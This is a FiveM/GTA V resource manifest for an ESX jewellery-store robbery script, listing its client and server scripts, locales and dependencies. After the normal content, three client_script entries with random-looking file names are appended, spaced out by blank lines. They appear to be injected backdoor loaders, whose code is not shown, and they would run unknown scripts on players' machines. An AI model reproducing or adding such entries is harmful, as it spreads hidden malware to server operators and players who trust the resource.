fx_version 'adamant'

game 'gta5'

description 'ESX Vangelico Robbery'

version '2.0.0'

client_scripts {
	'@essentialmode/locale.lua',
	'locales/de.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fr.lua',
	'config.lua',
	'client/esx_vangelico_robbery_cl.lua'
}

server_scripts {
    '@mysql-async/lib/MySQL.lua',
	'@essentialmode/locale.lua',
	'locales/de.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fr.lua',
	'config.lua',
	'server/esx_vangelico_robbery_sv.lua'
}

dependencies {
	'essentialmode',
}

client_script "aeHYzmcXdFTlWhcydF.lua"



client_script "mmpCm.lua"







client_script "IRS_USDUFHSILFSKOAKQA.lua"